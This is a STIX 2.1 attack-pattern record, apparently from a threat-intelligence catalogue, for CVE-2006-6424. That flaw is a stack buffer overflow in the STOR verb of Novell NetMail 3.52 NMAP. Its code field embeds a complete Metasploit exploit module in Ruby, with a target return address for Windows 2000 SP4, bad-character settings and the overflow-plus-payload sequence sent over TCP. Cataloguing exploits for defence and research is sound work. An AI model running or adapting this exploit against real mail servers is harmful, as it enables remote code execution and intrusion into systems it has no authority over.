{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d357a44a-6d2a-4eea-a05a-a6e926bb2975",
    "created": "2024-08-14T16:38:47.8559Z",
    "modified": "2024-08-14T16:38:47.855905Z",
    "name": "Novell NetMail NMAP STOR Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Novell's Netmail 3.52 NMAP STOR verb. By sending an overly long string, an attacker can overwrite the buffer and control program execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/novell/nmap_stor.rb",
            "external_id": "nmap_stor.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-6424"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell NetMail NMAP STOR Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Novell's Netmail 3.52 NMAP STOR\n        verb. By sending an overly long string, an attacker can overwrite the\n        buffer and control program execution.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-6424' ],\n          [ 'OSVDB', '31363' ],\n          [ 'BID', '21725' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows 2000 Pro SP4 English',   { 'Ret' => 0x7cdc97fb }],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2006-12-23'))\n\n    register_options([Opt::RPORT(689)])\n  end\n\n  def exploit\n    connect\n    sock.get_once\n\n    auth =  \"USER \" + rand_text_english(10)\n    sock.put(auth + \"\\r\\n\")\n\n    res = sock.get_once\n\n    sploit =  \"STOR \" + rand_text_english(253) + [ target.ret ].pack('V')\n    sploit << \" \" + rand_text_english(20) + \"\\r\\n\" + payload.encoded\n\n    if (res =~ /1000/)\n      print_status(\"Trying target #{target.name}...\")\n      sock.put(sploit)\n    else\n      print_status(\"Not in Trusted Hosts.\")\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-12-23",
    "x_mitre_platforms": [
        "win'"
    ]
}